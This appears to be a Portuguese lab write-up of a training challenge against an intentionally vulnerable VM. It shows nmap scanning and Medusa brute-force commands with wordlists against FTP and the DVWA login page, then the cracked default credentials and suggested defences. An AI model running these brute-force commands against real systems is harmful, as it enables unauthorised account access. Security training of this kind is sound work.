### Reflexão e Aprendizado

Durante o desafio, aprendi na prática como ferramentas de força bruta exploram serviços vulneráveis e como uma configuração insegura pode expor sistemas críticos. 
Compreendi também a importância de ambientes isolados para testes éticos (como VMs), e de documentar cada etapa de forma clara para futuras auditorias ou treinamentos.
Também aprendi como algué m com pouco conhecimento pode fazer ataques de força bruta simples que podem custar milhões a empresas. 


<img width="1366" height="647" alt="Capturar" src="https://github.com/user-attachments/assets/684258e8-6587-4741-a602-33417fa442b6" />


1. Varredura de Serviços (Nmap)

O primeiro passo foi realizar uma varredura com o Nmap para identificar portas abertas e serviços em execução:

nmap -sV -p 21,22,80,445,139 192.168.56.102


O resultado mostrou os seguintes serviços ativos:

Porta 21 (FTP) – vsftpd 2.3.4

Porta 22 (SSH) – OpenSSH 4.7p1

Porta 80 (HTTP) – Apache 2.2.8 (Ubuntu)

Portas 139 e 445 (Samba) – smbd 3.X-4.X

A partir dessa identificação, os testes focaram nos serviços FTP e HTTP, que são os mais comuns para ataques de autenticação.

2. Ataque de Força Bruta no Serviço FTP

Primeiro, foi testada uma conexão direta via FTP para verificar se o serviço estava respondendo corretamente:

ftp 192.168.56.102


Em seguida, foram criados dois arquivos de listas para o ataque de força bruta:

echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
echo -e '12345\npassword\nqwerty\nmsfadmin' > pass.txt


Com os arquivos prontos, foi utilizado o Medusa, uma ferramenta de força bruta em serviços de rede, para testar combinações de usuários e senhas:

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6


Durante os testes, o Medusa identificou um login válido no serviço FTP:

ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]


Após a descoberta, foi feita uma tentativa de login manual, confirmando o sucesso da autenticação:

ftp 192.168.56.102
Name: msfadmin
Password: msfadmin
230 Login successful.


✅ Resultado: Acesso FTP obtido com sucesso utilizando o par de credenciais msfadmin:msfadmin.

3. Ataque de Força Bruta no Serviço HTTP (DVWA)

Após o sucesso no FTP, o próximo alvo foi o serviço web rodando em /dvwa/login.php, possivelmente o aplicativo Damn Vulnerable Web Application (DVWA).

Foram realizadas várias tentativas de ataque com o Medusa, utilizando o módulo HTTP:

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6


Embora o Medusa tenha emitido alguns avisos de método inválido, ele conseguiu identificar combinações consideradas válidas:

ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: qwerty [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: 12345 [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: password [SUCCESS]


✅ Resultado: Diversas combinações de credenciais foram aceitas pela aplicação web, 
indicando ausência de mecanismos de proteção como rate limiting ou captcha, tornando o sistema vulnerável a ataques automatizados.

4. Conclusão e Observações

Durante o desafio, foi possível identificar vulnerabilidades em dois serviços principais:

FTP (vsftpd 2.3.4) — Permitia autenticação com credenciais fracas (“msfadmin:msfadmin”).

HTTP (DVWA) — Também vulnerável a força bruta, sem proteção contra múltiplas tentativas de login.

Esses resultados demonstram a importância de práticas básicas de segurança, como:

Desabilitar ou restringir o FTP;

Implementar senhas fortes;

Limitar tentativas de autenticação;

Manter os serviços e versões do sistema atualizados.

🧰 Ferramentas Utilizadas

Nmap – para varredura e identificação de serviços

FTP client – para validação manual de credenciais

Medusa – para ataques de força bruta automatizados



Rodrigo Miranda,
www.linkedin.com/in/rodrigo-h-miranda
https://rodrigomirandadev.carrd.co

